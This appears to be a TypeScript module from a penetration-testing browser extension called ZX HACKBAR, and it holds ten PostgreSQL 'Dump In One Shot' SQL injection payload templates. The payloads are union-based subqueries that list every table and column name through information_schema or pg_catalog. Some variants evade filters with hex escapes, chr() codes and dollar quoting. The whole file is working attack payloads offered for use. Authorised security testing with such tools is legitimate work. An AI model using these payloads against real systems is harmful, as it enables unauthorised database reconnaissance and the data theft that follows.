/**
 * ZX HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module UnionBasedDiosPostgre
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description Union-Based PostgreSQL Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const diosPostgreTemplates: BuilderTemplate[] = [
  {
    id: 'dios-postgre-string-agg',
    name: 'string_agg() DIOS',
    tags: ['postgresql', 'string_agg', 'standard'],
    description: 'PostgreSQL standard schema and table dump via string_agg()',
    content: "(SELECT string_agg(table_name||':'||column_name, E'\n') FROM information_schema.columns WHERE table_schema=current_schema())"
  },
  {
    id: 'dios-postgre-array-to-string',
    name: 'array_to_string(array_agg()) DIOS',
    tags: ['postgresql', 'array_agg', 'array_to_string'],
    description: 'PostgreSQL array aggregation DIOS with newline separator',
    content: "(SELECT array_to_string(array_agg(table_name||'::'||column_name), chr(10)) FROM information_schema.columns WHERE table_schema=current_schema())"
  },
  {
    id: 'dios-postgre-pg-catalog',
    name: 'pg_catalog (Non-InfoSchema) DIOS',
    tags: ['postgresql', 'pg_catalog', 'internal'],
    description: 'Bypass information_schema using internal pg_class and pg_attribute catalog',
    content: "(SELECT string_agg(c.relname||':'||a.attname, chr(10)) FROM pg_class c JOIN pg_attribute a ON a.attrelid=c.oid WHERE c.relkind='r' AND a.attnum>0 AND NOT a.attisdropped AND c.relnamespace=(SELECT oid FROM pg_namespace WHERE nspname=current_schema()))"
  },
  {
    id: 'dios-postgre-query-to-xml',
    name: 'query_to_xml() DIOS',
    tags: ['postgresql', 'xml', 'query_to_xml'],
    description: 'PostgreSQL XML-based entire schema & columns dump',
    content: "(SELECT query_to_xml('SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=current_schema()', true, false, ''))"
  },
  {
    id: 'dios-postgre-json-agg',
    name: 'json_agg() JSON DIOS',
    tags: ['postgresql', 'json', 'json_agg'],
    description: 'PostgreSQL JSON array extraction of tables and columns (v9.3+)',
    content: "(SELECT json_agg(json_build_object('table', table_name, 'column', column_name)) FROM information_schema.columns WHERE table_schema=current_schema())"
  },
  {
    id: 'dios-postgre-all-schemas',
    name: 'Multi-Schema / All DB DIOS',
    tags: ['postgresql', 'all-db', 'dump'],
    description: 'Extract tables and columns across all non-system schemas',
    content: "(SELECT string_agg(table_schema||'.'||table_name||':'||column_name, chr(10)) FROM information_schema.columns WHERE table_schema NOT IN ('information_schema','pg_catalog'))"
  },
  {
    id: 'dios-postgre-hex-escape',
    name: "Hex Byte Escape (E'\\x3a') DIOS",
    tags: ['postgresql', 'hex', 'byte-escape'],
    description: 'Hex byte literal escape sequence E\'\\x3a\' without regular quotes',
    content: "(SELECT string_agg(table_name||E'\\x3a'||column_name, E'\\x0a') FROM information_schema.columns WHERE table_schema=current_schema())"
  },
  {
    id: 'dios-postgre-chr-hex',
    name: 'chr(0x3a) Hex Integer DIOS',
    tags: ['postgresql', 'chr', 'hex-ascii'],
    description: 'ASCII characters represented via hex integer values chr(0x3a) and chr(0x0a)',
    content: "(SELECT string_agg(table_name||chr(0x3a)||column_name, chr(0x0a)) FROM information_schema.columns WHERE table_schema=current_schema())"
  },
  {
    id: 'dios-postgre-dollar-quoting',
    name: 'Dollar-Quoting ($$) DIOS',
    tags: ['postgresql', 'dollar-quote', 'no-quotes'],
    description: 'PostgreSQL unquoted literal representation using dollar quotes ($$)',
    content: "(SELECT string_agg(table_name||$$:$$||column_name, chr(10)) FROM information_schema.columns WHERE table_schema=current_schema())"
  },
  {
    id: 'dios-postgre-pg-catalog-class',
    name: 'pg_catalog (pg_class & pg_attribute) DIOS',
    tags: ['postgresql', 'pg_catalog', 'no-info-schema'],
    description: 'Native PostgreSQL catalog extraction using pg_class and pg_attribute without information_schema',
    content: "(SELECT string_agg(c.relname||':'||a.attname, E'\\n') FROM pg_class c JOIN pg_attribute a ON c.oid=a.attrelid WHERE a.attnum > 0 AND NOT a.attisdropped AND c.relkind='r' AND c.relnamespace=(SELECT oid FROM pg_namespace WHERE nspname=current_schema()))"
  }
];

export const diosPostgreSubcategory: BuilderSubcategory = {
  id: 'dios-postgre',
  label: 'DIOS PostgreSQL',
  description: 'PostgreSQL Dump In One Shot (DIOS) templates (string_agg, array_agg, pg_catalog, hex escape, chr hex)',
  templates: diosPostgreTemplates
};
